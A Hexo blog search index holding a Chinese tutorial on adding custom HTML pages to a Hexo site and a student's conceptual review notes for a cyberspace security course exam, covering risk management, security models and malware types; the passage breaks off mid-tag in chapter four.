<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hexo添加自定义HTML页面</title>
      <link href="/blog/2025/01/16/%E5%85%B6%E4%BB%96/Hexo%E5%BB%BA%E7%AB%99/Hexo%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89HTML%E9%A1%B5%E9%9D%A2/"/>
      <url>/blog/2025/01/16/%E5%85%B6%E4%BB%96/Hexo%E5%BB%BA%E7%AB%99/Hexo%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89HTML%E9%A1%B5%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="Hexo添加自定义HTML页面"><a href="#Hexo添加自定义HTML页面" class="headerlink" title="Hexo添加自定义HTML页面"></a>Hexo添加自定义HTML页面</h1><h3 id="首先，在博客根目录的source文件夹下，新建文件夹用于存放HTML文件"><a href="#首先，在博客根目录的source文件夹下，新建文件夹用于存放HTML文件" class="headerlink" title="首先，在博客根目录的source文件夹下，新建文件夹用于存放HTML文件"></a>首先，在博客根目录的<code>source</code>文件夹下，新建文件夹用于存放HTML文件</h3><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-16 19.22.06.png" alt="截屏2025-01-16 19.22.06" style="zoom: 33%;" /><p>这里新建了个<code>html</code>文件夹，然后直接在里面放文件。</p><h3 id="第二步，在博客根目录的配置文件-config-yml文件里，配置跳过渲染"><a href="#第二步，在博客根目录的配置文件-config-yml文件里，配置跳过渲染" class="headerlink" title="第二步，在博客根目录的配置文件_config.yml文件里，配置跳过渲染"></a>第二步，在博客根目录的配置文件<code>_config.yml</code>文件里，配置跳过渲染</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">skip_render:</span> <span class="string">&quot;html/**&quot;</span></span><br></pre></td></tr></table></figure><p>注意格式：这里如果只创建了一个文件夹，要跳过它目录下所有文件的渲染，则</p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="meta"># 跳过文件夹下所有文件</span></span><br><span class="line">skip_render: </span><br><span class="line">  - <span class="string">&quot;文件夹名/*&quot;</span>  </span><br></pre></td></tr></table></figure><p>如果文件夹下还有子文件夹，则</p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="meta"># 跳过子文件夹</span></span><br><span class="line">skip_render: </span><br><span class="line">  - <span class="string">&quot;文件夹名/子文件夹名/*&quot;</span></span><br></pre></td></tr></table></figure><p>或者，</p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="meta"># 跳过文件夹下所有子文件夹和文件</span></span><br><span class="line">skip_render: </span><br><span class="line">  - <span class="string">&quot;文件夹名/**&quot;</span>   </span><br></pre></td></tr></table></figure><p>重新部署即可。</p><h2 id="其他的优化"><a href="#其他的优化" class="headerlink" title="其他的优化"></a>其他的优化</h2><p>如果想将这些html的界面放到导航菜单栏上，修改主题配置文件_config.butterfly.yml对应的导航菜单栏代码即可，如下，</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">   <span class="string">主页:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">   <span class="string">时间轴:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-archive</span></span><br><span class="line">   <span class="string">标签:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-tags</span></span><br><span class="line">   <span class="string">分类:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-folder-open</span></span><br><span class="line">   <span class="string">Demo||fas</span> <span class="attr">fa-file-code:</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">all</span> <span class="string">html</span> <span class="string">demo</span> <span class="string">||</span> <span class="string">/Demo/</span> <span class="string">||</span> <span class="string">far</span> <span class="string">fa-file-code</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">圈小猫</span> <span class="string">||</span> <span class="string">/HTML/圈小猫.html</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-code</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">撕渔网</span> <span class="string">||</span> <span class="string">/HTML/撕渔网.html</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-code</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">纸飞机</span> <span class="string">||</span> <span class="string">/HTML/纸飞机.html</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-code</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">彩虹雨</span> <span class="string">||</span> <span class="string">/HTML/彩虹雨.html</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-code</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">方块穿梭</span> <span class="string">||</span> <span class="string">/HTML/方块穿梭.html</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-code</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">碰撞小球</span> <span class="string">||</span> <span class="string">/HTML/碰撞小球.html</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-code</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">烟花效果</span> <span class="string">||</span> <span class="string">/HTML/烟花效果.html</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-code</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">骇客帝国</span> <span class="string">||</span> <span class="string">/HTML/骇客帝国.html</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-code</span></span><br><span class="line">   <span class="string">娱乐||fas</span> <span class="attr">fa-list:</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">音乐</span> <span class="string">||</span> <span class="string">/music/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-music</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">电影</span> <span class="string">||</span> <span class="string">/movies/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-video</span></span><br><span class="line">   <span class="string">友链:</span> <span class="string">/link/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-link</span></span><br><span class="line">   <span class="string">关于:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-heart</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>本文转载自：<a href="https://blog.csdn.net/weixin_58068682/article/details/116611715">https://blog.csdn.net/weixin_58068682/article/details/116611715</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
          <category> Hexo建站 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网络空间安全技术期末整理</title>
      <link href="/blog/2025/01/16/SCU/2024-2025%E5%AD%A6%E5%B9%B4/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF_final/"/>
      <url>/blog/2025/01/16/SCU/2024-2025%E5%AD%A6%E5%B9%B4/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF_final/</url>
      
        <content type="html"><![CDATA[<p>基本情况</p><ul><li><p>题型：</p><ul><li>选择（20*1）</li><li>判断（10*1）</li><li>名词解释</li><li>简答题</li><li>设计题</li><li>综合分析题</li></ul></li><li><p>关注小测验里的选择题</p></li><li><p>五次作业题会考一个大题</p></li><li><p>关注ppt里面红色的部分！</p></li></ul><h1 id="CH1-网络空间安全概述"><a href="#CH1-网络空间安全概述" class="headerlink" title="CH1-网络空间安全概述"></a>CH1-网络空间安全概述</h1><h2 id="1-1-信息安全的基本目标"><a href="#1-1-信息安全的基本目标" class="headerlink" title="1.1.信息安全的基本目标"></a>1.1.信息安全的基本目标</h2><p>&#x3D;&#x3D;CIA&#x3D;&#x3D;</p><ul><li>机密性（Confidentiality）</li><li>完整性（Integrity）</li><li>可用性（Availability）</li></ul><h2 id="1-2-什么是信息安全"><a href="#1-2-什么是信息安全" class="headerlink" title="1.2.什么是信息安全"></a>1.2.什么是信息安全</h2><p>信息本身的机密性（Confidentiality）、完整性（Integrity）和可用性（Availability）的保持（一分），即<strong>防止未经授权使用信息</strong>（一分）、<strong>防止对信息的非法修改和破坏</strong>（一分）、<strong>确保及时可靠地使用信息</strong>（一分）。</p><ul><li>机密性：确保信息没有非授权的泄漏，不被非授权的个人、组织和计算机程序使用</li><li>完整性：确保信息没有遭到篡改和破坏</li><li>可用性：确保拥有授权的用户或程序可以及时、正常使用信息</li></ul><h2 id="1-3-网络安全的基本定义-组成"><a href="#1-3-网络安全的基本定义-组成" class="headerlink" title="1.3.网络安全的基本定义+组成"></a>1.3.网络安全的基本定义+组成</h2><h3 id="1-3-1-网络安全的四个要素（网络空间的组成）"><a href="#1-3-1-网络安全的四个要素（网络空间的组成）" class="headerlink" title="1.3.1.网络安全的四个要素（网络空间的组成）"></a>1.3.1.网络安全的四个要素（网络空间的组成）</h3><h4 id="1-3-1-1国家网络安全的四个要素"><a href="#1-3-1-1国家网络安全的四个要素" class="headerlink" title="1.3.1.1国家网络安全的四个要素"></a>1.3.1.1国家网络安全的四个要素</h4><p>设施、用户、操作、数据</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-23 21.00.35.png" alt="截屏2024-12-23 21.00.35" style="zoom: 25%;" /><h4 id="1-3-1-2-网络空间的组成"><a href="#1-3-1-2-网络空间的组成" class="headerlink" title="1.3.1.2.网络空间的组成"></a>1.3.1.2.网络空间的组成</h4><p>网络空间四要素：网络空间载体（设施）；网络空间资源（数据）； 网络活动主体（用户）；网络活动形式（操作）</p><ul><li>网络空间载体：设施，信息通信技术系统的集合</li><li>网络操作对象：数据，表达人类所能理解的意图的信号状态</li><li>网络活动主体：用户，网络活动的主体要素，属于人的代理</li><li>网络活动形式：操作，对数据的加工、存储、传输、展示等服务形式</li></ul><h3 id="1-3-2-网络空间的一般性定义"><a href="#1-3-2-网络空间的一般性定义" class="headerlink" title="1.3.2.&#x3D;&#x3D;网络空间的一般性定义&#x3D;&#x3D;"></a>1.3.2.&#x3D;&#x3D;网络空间的一般性定义&#x3D;&#x3D;</h3><blockquote><p>一般性定义是根据《国家网络空间安全战略》给出的定义</p></blockquote><p>网络空间是一种<strong>人造的电磁空间</strong>，其以互联网、各种通信系统与电信网、各种传播系统与广电网、各种计算机系统、各类关键工业设施中的嵌入式处理器和控制器等<strong>信息通信技术基础设施</strong>为载体，<strong>用户</strong>通过在其上对<strong>数据</strong>进行创造、存储、改变、传输、使用、展示等<strong>操作</strong>，以实现特定的信息通信技术活动。</p><h2 id="1-4-网络空间安全的四层次模型"><a href="#1-4-网络空间安全的四层次模型" class="headerlink" title="1.4.网络空间安全的四层次模型"></a>1.4.网络空间安全的四层次模型</h2><p>任何信息系统都会涉及四个层面： 电磁设备、电子信息系统、运行数据、系统应用</p><p>从上往下：</p><ul><li>应用层的安全：应对在信息应用的过程中所形成的安全问题，包括内容安全、应用安全等</li><li>数据层的安全：应对在网络空间中处理数据的同时所带来的安全问题，包括数据安全、身份安全、隐私保护等。</li><li>系统层的安全：应对在网络空间中信息系统自身所面对的安全问题，包括网络安全、软件安全等。</li><li>设备层的安全：应对在网络空间中信息系统设备所面对的安全问题，包括物理安全、环境安全、设备安全等。</li></ul><h1 id="CH2-网络空间安全风险及风险管理"><a href="#CH2-网络空间安全风险及风险管理" class="headerlink" title="CH2-网络空间安全风险及风险管理"></a>CH2-网络空间安全风险及风险管理</h1><h2 id="2-1-什么是网络空间安全风险管理（定义）"><a href="#2-1-什么是网络空间安全风险管理（定义）" class="headerlink" title="2.1.什么是网络空间安全风险管理（定义）"></a>2.1.什么是网络空间安全风险管理（定义）</h2><blockquote><p>了解风险+控制风险&#x3D;管理风险</p><p>风险管理是出现安全问题的原因。</p></blockquote><p><strong>定义一</strong>：（GB&#x2F;Z 24364《信息安全风险管理指南》 ）信息安全风险管理是识别、控制、消除或最小化可能影响系统资源的<u>不确定因素</u>的过程。</p><p>定义二：在组织机构内部识别、优化、管理风险， 使风险降低到可接受水平的过程。</p><h2 id="2-2-风险评估工具"><a href="#2-2-风险评估工具" class="headerlink" title="2.2.风险评估工具"></a>2.2.风险评估工具</h2><p>由风险评估工具得到风险评估的结果</p><ul><li>风险评估与管理工具（标准、知识、模型）<ul><li>基于<u>标准</u>的工具，如基于NIST SP 800-30或ISO 27005开发的工具</li><li>基于<u>知识</u>的工具，综合各种风险分析方法，形成知识库，以此为基础完成综合评估</li><li>基于<u>模型</u>的工具，对典型系统的资产、威胁、脆弱性建立量化或半量化的模型</li></ul></li><li>系统基础平台风险评估工具<ul><li><u>脆弱性扫描工具</u>（漏扫）：基于网络的扫描器、基于主机的扫描器、分布式网络扫描器、数据库脆弱性扫描器</li><li><u>渗透性测试工具</u>：黑客工具、脚本文件</li></ul></li><li>风险评估辅助工具<ul><li>检查列表、入侵检测系统（IDS）、安全审计工具、拓扑发现工具和资产信息收集系统，用于评估过程参考的评估指标库、知识库、漏洞库、算法库和模型库</li></ul></li></ul><h2 id="2-3-网络空间安全风险术语"><a href="#2-3-网络空间安全风险术语" class="headerlink" title="2.3.网络空间安全风险术语"></a>2.3.网络空间安全风险术语</h2><ul><li><p>资产（Asset）</p></li><li><p>威胁源（Threat Agent）</p></li><li><p>威胁（ Threat ）</p></li><li><p>脆弱性（Vunerability）</p></li><li><p>控制措施（Countermeasure,safeguard,control）</p></li><li><p>可能性（Likelihood,Probability）</p></li><li><p>影响（ Impact,loss ）</p></li><li><p>风险（ Risk）</p></li><li><p>残余风险（Residental Risk）</p></li></ul><blockquote><ul><li>资产：有价值的</li><li>脆弱性：与资产有关的弱点或安全隐患，是造成风险的内因（eg.代码缺陷）。脆弱性本身并不对资产构成危害，但是满足一定条件时，脆弱性会被威胁源利用恰当的威胁方式对资产造成不良后果（形成风险？</li><li>控制措施：防范威胁，降低风险的措施。eg.部署防火墙</li><li>可能性：威胁源利用脆弱性造成不良后果的可能性</li><li>影响：威胁源利用脆弱性造成不良后果的程度大小</li><li>风险：威胁源可能采用恰当的威胁方式利用脆弱性造成不良后果</li><li>残余风险：采取了安全措施后仍然可能存在的风险（综合考虑成本与效益）</li></ul></blockquote><h3 id="2-3-1-资产"><a href="#2-3-1-资产" class="headerlink" title="2.3.1.资产"></a>2.3.1.资产</h3><p>（什么是资产？列举一些事物，来判断什么是资产）</p><p><strong>定义</strong>：资产是任何对组织有价值的东西，是要保护的对象。</p><p><strong>资产以多种形式存在（多种分类方法）</strong></p><ul><li>物理的（如计算设备、网络设备和存储介质等）和逻辑的（如体 系结构、通信协议、计算程序和数据文件等）；</li><li>硬件的（如计算机主板、机箱、显示器、键盘和鼠标等）和软件的 （如操作系统软件、数据库管理软件、工具软件和应用软件等）；</li><li><u>有形的（如机房、设备和人员等）和无形的（如品牌、信心和名誉等）</u>；</li><li><u>静态的（如设施和规程等）和动态的（如人员和过程等）</u>；</li><li>技术的（如计算机硬件、软件和固件等）和管理的（如业务目标 、战略、策略、规程、过程、计划和人员等）等</li></ul><h3 id="2-3-2-威胁"><a href="#2-3-2-威胁" class="headerlink" title="2.3.2.威胁"></a>2.3.2.威胁</h3><p>概念：可能导致组织机构出现网络安全事件和信息资源损失的活动，威胁是一个<strong>动作</strong>，<u>威胁源是威胁动作的发起者</u></p><ul><li>内部人员威胁</li><li>黑客渗透</li><li>木马后门</li><li>病毒和蠕虫</li><li>流氓软件</li><li>拒绝服务</li><li>社会工程</li><li>地震、雷雨、失火</li><li>供电中断</li><li>网络通信故障</li><li>硬件故障</li><li>系统漏洞</li></ul><h3 id="2-3-3-脆弱性（漏洞-vulnerability）"><a href="#2-3-3-脆弱性（漏洞-vulnerability）" class="headerlink" title="2.3.3.脆弱性（漏洞-vulnerability）"></a>2.3.3.脆弱性（漏洞-vulnerability）</h3><p>概念：与信息资产有关的弱点或安全隐患。</p><p>造成风险的内因，脆弱性是固有的，本身一定会存在漏洞，但是没被利用则不会形成安全事件。</p><p>脆弱性本身并不对资产构成危害，但是在一定条件得满足时，脆弱性会被威胁源利用恰当的威胁方式对信息资产造成危害。</p><p><strong>脆弱性举例</strong></p><ul><li>系统程序代码缺陷</li><li>系统设备安全配置错误</li><li>系统操作流程有缺陷</li><li>维护人员安全意识不足</li></ul><h3 id="2-3-4-控制措施"><a href="#2-3-4-控制措施" class="headerlink" title="2.3.4.控制措施"></a>2.3.4.控制措施</h3><p>根据安全需求部署，用来防范威胁，降低风险的措施。</p><p>举例</p><ul><li>部署防火墙、入侵检测、审计系统</li><li>测试环节</li><li>操作审批环节</li><li>应急体系</li><li>终端U盘管理制度</li></ul><h3 id="2-3-5-风险"><a href="#2-3-5-风险" class="headerlink" title="2.3.5.&#x3D;&#x3D;风险&#x3D;&#x3D;"></a>2.3.5.&#x3D;&#x3D;风险&#x3D;&#x3D;</h3><p><strong><u>指威胁源采用恰当的威胁方式利用脆弱性造成不良后果。</u></strong></p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-24 11.39.08.png" alt="截屏2024-12-24 11.39.08" style="zoom: 25%;" /><p>如：网站存在SQL注入漏洞，普通攻击者利用自动化攻击工具很容易控制网站，修改网站内容，从而损害国家政府部门声誉。</p><p><strong>概念</strong>：</p><ol><li><p><strong><u>GB&#x2F;T 20984的定义：网络空间安全风险是人为或自然的威胁利用信息系统及其管理体系中存在的脆弱性导致安全事件的发生及其对组织造成的影响。</u></strong></p></li><li><p>网络空间安全风险是指一种特定的威胁利用一种或一组脆弱性造成组织的资产损失或损害的可能性。</p></li><li><p>网络空间安全风险是指信息资产的机密性、完整性和可用性遭到破坏的可能性。</p></li><li><p><u>网络空间安全风险只考虑那些对组织有<strong>负面</strong>影响的事件。</u>（会考判断题）</p></li></ol><p>这些定义强调了网络空间安全风险的多方面因素，包括威胁的来源、脆弱性的利用、资产的损失或损害，以及对组织的具体影响。</p><h3 id="2-3-6-残余风险"><a href="#2-3-6-残余风险" class="headerlink" title="2.3.6.残余风险"></a>2.3.6.残余风险</h3><p>概念：</p><ul><li><p><u>指采取了安全措施后，信息系统仍然可能存在的风险。</u></p></li><li><p>有些残余风险是在综合<u>考虑了安全成本与效益后</u>不去控制的风险（风险管理是要付出代价的）</p></li><li><p>残余风险应受到密切监视，它<u>可能会在将来诱发新的安全事件</u>（此一时彼一时）</p></li></ul><p>举例</p><ul><li>风险列表中有10类风险，根据风险成本效益分析，只有前8项需要控制，则另2项为残余风险，一段时间内系统处于风险可接受水平。</li></ul><h2 id="2-4-常用的四类风险处置方法"><a href="#2-4-常用的四类风险处置方法" class="headerlink" title="2.4.常用的四类风险处置方法"></a>2.4.常用的四类风险处置方法</h2><ul><li>减低风险</li><li>转移风险</li><li>规避风险</li><li>接受风险</li></ul><h2 id="2-5-风险分析"><a href="#2-5-风险分析" class="headerlink" title="2.5.风险分析"></a>2.5.风险分析</h2><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-24 11.44.34.png" alt="截屏2024-12-24 11.44.34" style="zoom: 25%;" /><h2 id="2-6-国产化替代"><a href="#2-6-国产化替代" class="headerlink" title="2.6.国产化替代"></a>2.6.国产化替代</h2><p><strong>国产化替代究竟替什么</strong>？</p><ul><li>答案是<strong>替代被垄断的国外产品。</strong></li></ul><p>在第十四届中国（南京）国际软件产品和信息服务交易博览会上，倪光南院士提到，目前信息技术国产化替代在不同领域正在加速推进。这包括：</p><ul><li><strong>国产桌面计算机技术体系对Wintel体系的替代；</strong></li><li><strong>高端服务器和数据库对“IOE”的替代。</strong></li></ul><blockquote><p>这里的“Wintel体系”指的是微软的Windows操作系统和英特尔的处理器技术体系，</p><p>而“IOE”通常指的是IBM的硬件（大型计算机）、甲骨文（Oracle）的数据库软件以及EMC的存储设备。</p></blockquote><p>国产化替代的目的是减少对这些国外产品的依赖，推动国内信息技术产业的发展。</p><p>**为什么要国产化替代：**自主可控，规避依赖导致的风险。</p><h1 id="CH3-信息与网络空间安全保障"><a href="#CH3-信息与网络空间安全保障" class="headerlink" title="CH3-信息与网络空间安全保障"></a>CH3-信息与网络空间安全保障</h1><h2 id="3-1-信息系统安全保障"><a href="#3-1-信息系统安全保障" class="headerlink" title="3.1.信息系统安全保障"></a>3.1.信息系统安全保障</h2><p>信息系统安全保障是在信息系统的<strong>整个生命周期</strong>中，从<strong>技术、管理、工程和人员</strong>等方面提出安全保障要求，确保信息系统的<strong>机密性、完整性和可用性</strong>，降低安全风险到可接受的程度，从而保障系统实现组织机构的使命。</p><h2 id="3-2-安全模型的概念"><a href="#3-2-安全模型的概念" class="headerlink" title="3.2.安全模型的概念"></a>3.2.安全模型的概念</h2><h3 id="3-2-1-什么是网络空间安全模型"><a href="#3-2-1-什么是网络空间安全模型" class="headerlink" title="3.2.1.什么是网络空间安全模型"></a>3.2.1.什么是网络空间安全模型</h3><ul><li>通过建模的思想来解决网络安全管理问题，有效抵御外部攻击，保障网络安全。</li><li>安全模型用于精确和形式地描述信息系统的安全特征，解释系统安全相关行为。</li></ul><h3 id="3-2-2-为什么需要安全模型"><a href="#3-2-2-为什么需要安全模型" class="headerlink" title="3.2.2.为什么需要安全模型"></a>3.2.2.为什么需要安全模型</h3><ul><li>能准确地描述安全的<u>重要方面</u>与系统行为的关系。（模型的处理方式，更能抓住重点）</li><li>能提高对成功实现关键安全需求的理解<u>层次</u>。（层次化、分段化的模型利于问题的处理）</li><li>从中开发出一套安全性评估<u>准则</u>，和关键的描述变量。（标准化、规则化处理）</li></ul><h2 id="3-3-PDR演变"><a href="#3-3-PDR演变" class="headerlink" title="3.3.PDR演变"></a>3.3.PDR演变</h2><h3 id="3-3-1-PDR"><a href="#3-3-1-PDR" class="headerlink" title="3.3.1.PDR"></a>3.3.1.PDR</h3><blockquote><p>出发点：任何防护措施都是基于时间的，是可以被攻破的</p></blockquote><p>PDR：protect+detect+response，强调落实反应</p><h3 id="3-3-2-PDRR"><a href="#3-3-2-PDRR" class="headerlink" title="3.3.2.PDRR"></a>3.3.2.PDRR</h3><p>PDRR：protect+detect+react+<strong>restore</strong>，强调自动故障恢复能力</p><ul><li>保护（Protect）<br>作为基础，将保护视为活动过程。</li><li>检测（Detect）<br>用检测手段发现安全漏洞。</li><li>反应（React）<br>采取应急响应措施对抗入侵。</li><li><strong>恢复（Restore）</strong><br>系统被入侵后，采取措施将其恢复到正常状态。</li></ul><h3 id="3-3-3-分布式动态主动模型PPDR"><a href="#3-3-3-分布式动态主动模型PPDR" class="headerlink" title="3.3.3.分布式动态主动模型PPDR"></a>3.3.3.分布式动态主动模型PPDR</h3><p>PPDR：<strong>policy</strong>+protect+detect+response，强调控制和对抗（系统安全的动态性），以安全检测、漏洞监测和自适应填充“安全间隙”为循环，特别考虑人为的管理因素。</p><blockquote><p>在整体的安全策略的控制和指导下，综合运用防护工具（如防火墙、身份鉴别、加密等）的同时，利用检测工具（如漏洞评估、入侵检测系统）了解和评估系统的安全状态，通过适当的响应将系统调整到一个比较安全的状态。保护、检测和响应组成了一个完整的、动态的安全循环。</p></blockquote><ul><li>policy：策略，<strong>模型的核心</strong>；所有的防护、检测、响应都是依据安全策略实施的；策略体系的建立包括安全策略的制定、评估与执行等。策略包括访问控制策略、加密通信策略、身份认证策略、备份恢复策略……</li><li>protection：防护，通过传统的静态安全技术和方法提高网络的防护能力，主要包括：访问控制技术、信息加密技术、身份鉴别技术……</li><li>detect：检测，利用检测工具，监视、分析、审计网络活动，了解判断网络系统的安全状态；使安全防护从被动防护演进到<strong>主动防御</strong>，是整个模型<strong>动态性的体现</strong>；如实时监控、报警……</li><li>response：反应，在检测到安全漏洞和安全事件时，通过及时的响应措施将网络系统的安全性调整到风险最低的状态。评估系统受到的危害与损失，恢复系统功能和数据，启动备份系统等。主要方法包括：关闭服务、跟踪、反击……</li></ul><p>（<strong>关注时间关系</strong>）</p><p><strong>数学法则：Pt &gt; Dt + Rt</strong></p><ul><li><p>Pt是防护时间（有效防御攻击的时间）</p></li><li><p>Dt是检测时间（发起攻击到检测到的时间）</p></li><li><p>Rt是反应时间（检测出攻击到处理完成时间）</p></li><li><p>Et是暴露时间</p><ul><li><p>如果Pt＞Dt＋Rt，那么系统是安全的。</p></li><li><p>如果Pt＜Dt＋Rt，那么Et＝(Dt＋Rt)－Pt。</p></li></ul></li></ul><h2 id="3-4-IATF-深度防御保障模型"><a href="#3-4-IATF-深度防御保障模型" class="headerlink" title="3.4.IATF-深度防御保障模型"></a>3.4.IATF-深度防御保障模型</h2><blockquote><ol><li>代表理论：深度防御</li><li>三个核心要素。<br>1）人(People)<br>信息保障体系的核心，是第一位的要素，同时也是最脆弱的。<br>2）技术（Technology）<br>实现信息保障的重要手段。<br>动态的技术体系：防护、检测、响应、恢复<br>3）操作(Operation)<br>是将各方面技术紧密结合的主动过程，构成安全保障的主动防御体系。</li><li>四个信息安全保障领域（三保护一支撑）<br>1）本地计算环境<br>2）区域边界<br>3）网络和基础设施<br>4）支撑性基础设施</li></ol></blockquote><p>信息保障技术框架（Information Assurance  Technical Framework，IATF）</p><p>NSA制定的，为保护美国政府和工业界的信息与信息技 术设施提供技术指南。</p><p>IATF的<strong>代表理论</strong>为“<u>深度防御（Defense-in-Depth）</u>”。</p><p>在关于实现信息保障目标的过程和方法上，IATF论述了**<u>系统工程、系统采购、风险管理、鉴别和鉴定以及生命周期支持等过程</u>**，指出了一条较为清晰的建设信息保障体系的路子。</p><h2 id="3-5-何谓“深度防御”"><a href="#3-5-何谓“深度防御”" class="headerlink" title="3.5.何谓“深度防御”"></a>3.5.何谓“深度防御”</h2><ul><li><p>IATF强调**<u>人、技术、操作</u>**这三个核心要素，从多种不同的角度对信息系统进行防护。</p></li><li><p>IATF关注四个信息安全保障领域<u>（三保护一支撑）</u></p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-26 20.27.50.png" alt="截屏2024-12-26 20.27.50" style="zoom: 25%;" /><ul><li><p>本地计算环境</p></li><li><p>区域边界</p></li><li><p>网络和基础设施</p></li><li><p>支撑性基础设施</p><ul><li>保护了本地计算环境、区域边界、网络和基础设施，来构建一个支撑环境以实现三保护</li></ul></li></ul></li></ul><p>在此基础上，对信息信息系统就可以做到多层防护，实现组织的任务&#x2F;业务运作。这样的防护被称为 “<u>深度防护战略（Defense-in-Depth Strategy）</u>”。</p><h2 id="3-6-IATF的三要素"><a href="#3-6-IATF的三要素" class="headerlink" title="3.6.IATF的三要素"></a>3.6.IATF的三要素</h2><ul><li>人（People）：<ul><li>信息保障体系的<strong>核心，是第一位的要素</strong>，同时也是最脆弱的。</li><li>基于这样的认识，安全管理在安全保障体系中愈显重要，包括：<ul><li>意识培训、组织管理、技术管理、操作管理</li></ul></li></ul></li><li>技术（Technology）：<ul><li>技术是实现信息保障的<strong>重要手段</strong>。</li><li>动态的技术体系：<ul><li>防护、检测、响应、恢复</li></ul></li></ul></li><li>操作（Operation）：<ul><li>也叫<strong>运行</strong>，构成安全保障的主动防御体系。</li><li>也是将各方面技术紧密结合在一起的主动的过程，包括：<ul><li>风险评估、安全监控、安全审计</li><li>跟踪告警、入侵检测、响应恢复</li></ul></li></ul></li></ul><h2 id="3-7-IATF的安全需求划分"><a href="#3-7-IATF的安全需求划分" class="headerlink" title="3.7.IATF的安全需求划分"></a>3.7.IATF的安全需求划分</h2><p>IATF定义了四个主要的技术焦点领域：</p><ul><li>本地计算环境</li><li>区域边界</li><li>网络和基础设施</li><li>支撑性基础设施</li></ul><p>这四个领域构成了完整的信息保障体系所涉及的范围。</p><p>在每个领域范围内，IATF都描述了其特有的安全需求和相应的可供选择的技术措施。这些领域共同确保了信息系统的安全性和可靠性，通过在不同层面上实施安全措施来保护信息资产。</p><h2 id="3-8-DDOS事件处理"><a href="#3-8-DDOS事件处理" class="headerlink" title="3.8.DDOS事件处理"></a>3.8.DDOS事件处理</h2><p><strong>SYN Flood攻击：</strong></p><p>使用抗DDOS设备或其他专用防护设备来进行防护，**<u>默认参数下</u>**就可以达到比较好的效果。</p><p>（图片勘误：“SYS请求”和“SYS包”系笔误，应该是“SYN请求”和“SYN包”）</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-24 14.33.29.png" alt="截屏2024-12-24 14.33.29" style="zoom: 25%;" /><h2 id="3-9-常见应急事件"><a href="#3-9-常见应急事件" class="headerlink" title="3.9.常见应急事件"></a>3.9.常见应急事件</h2><p>根据主机收到的攻击的表象可将木马病毒分为四类：</p><ol><li><p><strong>勒索病毒</strong>（也叫勒索木马）</p><ul><li>特征：磁盘文件被加密，一旦完成勒索过程则无法恢复文件。</li><li>防御策略：以预防为主，安装杀毒软件，做好主机防黑工作，及时打补丁，对重要文件要及时隔离备份。</li></ul></li><li><p><strong>挖矿木马</strong></p><ul><li>特征：CPU和GPU异常占用过高，且有对矿池地址的解析。</li><li>实现方式：可有落地文件实现，也可通过WMI等无落地文件实现。</li></ul></li><li><p><strong>远控木马</strong></p><ul><li>特点：一直是APT（高级持续性威胁）攻击的主流，复杂程度高。</li><li>功能：集成了攻击模块、控制模块、持久化模块等，且有C2（命令与控制）服务器。</li></ul></li><li><p><strong>普通木马</strong></p><ul><li>定义：指除上述类型之外的其他木马类型。</li></ul></li></ol><h1 id="CH4-网络空间安全技术体系与技术"><a href="#CH4-网络空间安全技术体系与技术" class="headerlink" title="CH4-网络空间安全技术体系与技术"></a>CH4-网络空间安全技术体系与技术</h1><h2 id="4-1-信息系统安全体系框架"><a href="#4-1-信息系统安全体系框架" 